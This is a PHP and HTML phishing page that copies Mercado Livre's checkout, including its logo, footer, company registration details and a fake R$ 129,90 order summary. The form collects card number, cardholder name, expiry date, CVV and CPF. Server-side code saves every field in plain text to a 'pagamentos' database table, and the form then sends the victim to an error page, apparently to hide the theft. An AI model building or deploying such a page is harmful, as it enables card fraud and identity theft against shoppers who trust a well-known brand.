<?php
if (isset($_POST['submit'])) {
    include_once('config.php');

    // Coletar dados do formulário
    $numero_cartao = $_POST['numero_cartao'];
    $nome_completo = $_POST['nome_completo'];
    $data_vencimento = $_POST['data_vencimento'];
    $codigo_seguranca = $_POST['codigo_seguranca'];
    $cpf_titular = $_POST['cpf_titular'];

    // Preparar e executar a consulta SQL
    $stmt = $conexao->prepare("INSERT INTO pagamentos (numero_cartao, nome_completo, data_vencimento, codigo_seguranca, cpf_titular) VALUES (?, ?, ?, ?, ?)");
    $stmt->bind_param("sssss", $numero_cartao, $nome_completo, $data_vencimento, $codigo_seguranca, $cpf_titular);

    if ($stmt->execute()) {
        echo "Pagamento realizado com sucesso!";
    } else {
        echo "Erro: " . $stmt->error;
    }

    $stmt->close();
    $conexao->close();
}
?>

<!DOCTYPE html>
<html lang="pt-BR">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Checkout</title>
    <link rel="shortcut icon"
    href="https://http2.mlstatic.com/frontend-assets/ml-web-navigation/ui-navigation/5.21.22/mercadolibre/favicon.svg"
    type="image/x-icon">
    <link rel="stylesheet" href="style.css">
</head>

<body>
    <header>
        <div class="header-container">
            <a href="https://www.mercadolivre.com.br/"><img src="img/ml-logo.png" alt="Logo" class="logo"></a>
            <a href="https://www.mercadolivre.com.br/ajuda#nav-header">Contato</a>
        </div>
    </header>
    <main>
    <div class="container">
        <div class="main-content">
            <div class="sec-adcard">
                <h1>Adicione um novo cartão</h1>
                <div class="adc-card">
                    <span class="card-icon">
                        <img id="buflo_congrats_payment_method_credit_card" class="bf-ui-icon bf-ui-icon--buflo_congrats_payment_method_credit_card"
                        src="https://http2.mlstatic.com/frontend-assets/bf-ui-library/3.31.0/assets/icons/buflo_congrats_payment_method_credit_card.svg">
                    </span>
                    <span data-js="rich-text" class="bf-ui-rich-text" aria-hidden="true">
                        Novo cartão de crédito
                    </span>
                </div>
            </div>
                    <form method="POST" action="paginadeerro.php">
                    <div class="form-container">
                        <div class="input-group">
                            <label for="numero_cartao">Número do cartão</label>
                            <input type="text" id="numero_cartao" name="numero_cartao" maxlength="19" required>
                        </div>
                        <div class="input-group">
                            <label for="nome_completo">Nome completo</label>
                            <input type="text" id="nome_completo" name="nome_completo" required>
                            <p>Conforme aparece no cartão</p>
                        </div>
                        <div class="dc">
                            <div class="input-group">
                                <label for="data_vencimento">Data de vencimento</label>
                                <input type="text" id="data_vencimento" name="data_vencimento" maxlength="5" required>
                                <p>Mês / Ano</p>
                            </div>
                            <div class="input-group">
                                <label for="codigo_seguranca">Código de segurança</label>
                                <input type="text" id="codigo_seguranca" name="codigo_seguranca"
                                    maxlength="3" required>
                                <p>CVV</p>
                            </div>
                        </div>
                        <div class="input-group">
                            <label for="cpf_titular">CPF do titular do cartão</label>
                            <input type="text" id="cpf_titular" name="cpf_titular" maxlength="14" required>
                        </div>
                    </div>
                        <div class="button-container">
                            <input type="submit" name="submit" id="enviar" class="btn" value="Continuar">
                        </div>
                    </form>
        </div>
        <div class="summary-container">
                <div class="resume">
                    <h3 style="margin-bottom: 20px;">Resumo da compra</h3>
                    <div class="linha">
                    </div>
                    <div class="summary-item">
                        <span>Produto:</span> <span>R$ 129,90</span>
                    </div>
                    <div class="summary-item">
                        <span>Frete:</span>
                        <span style="color: green;">Grátis</span>
                    </div>
                    <div class="linha">
                    </div>
                    <div class="summary-item">
                        <span>Você pagará:</span>
                        <span><strong>R$ 129,90</strong></span>
                    </div>
                </div>
        </div>
    </div>
    </main>
    <footer role="contentinfo" class="nav-footer">
        <div class="nav-footer-user-info nav-bounds">
            <div class="nav-footer-info-wrapper">
                <div class="nav-footer-primaryinfo">
                    <nav class="nav-footer-navigation">
                        <ul class="nav-footer-navigation__menu">
                            <li class="nav-footer-navigation__item"><a
                                    href="https://careers-meli.mercadolibre.com/pt?utm_campaign=site-mlb&amp;utm_source=mercadolibre&amp;utm_medium=mercadolibre"
                                    class="nav-footer-navigation__link">Trabalhe conosco</a></li>
                            <li class="nav-footer-navigation__item"><a
                                    href="https://www.mercadolivre.com.br/ajuda/Termos-e-condicoes-gerais-de-uso_1409"
                                    class="nav-footer-navigation__link">Termos e condições</a></li>
                            <li class="nav-footer-navigation__item"><a
                                    href="https://www.mercadolivre.com.br/l/promocoes"
                                    class="nav-footer-navigation__link">Promoções</a></li>
                            <li class="nav-footer-navigation__item"><a
                                    href="https://www.mercadolivre.com.br/privacidade"
                                    class="nav-footer-navigation__link">Como cuidamos da sua privacidade</a></li>
                            <li class="nav-footer-navigation__item"><a
                                    href="https://www.mercadolivre.com.br/acessibilidade"
                                    class="nav-footer-navigation__link">Acessibilidade</a></li>
                            <li class="nav-footer-navigation__item"><a href="https://www.mercadolivre.com.br/ajuda"
                                    class="nav-footer-navigation__link">Contato</a></li>
                            <li class="nav-footer-navigation__item"><a
                                    href="https://www.mercadolivre.com.br/ajuda/23303"
                                    class="nav-footer-navigation__link">Informações sobre seguros</a></li>
                        </ul>
                    </nav>
                    <small class="nav-footer-copyright">Copyright ©&nbsp;1999-2024
                        Ebazar.com.br LTDA.</small>
                </div>
                <p class="nav-footer-secondaryinfo">CNPJ n.º 03.007.331/0001-41 / Av. das Nações Unidas, nº 3.003,
                    Bonfim, Osasco/SP - CEP 06233-903 - empresa do grupo Mercado Livre.</p>
            </div>
        </div>
    </footer>
</body>

</html>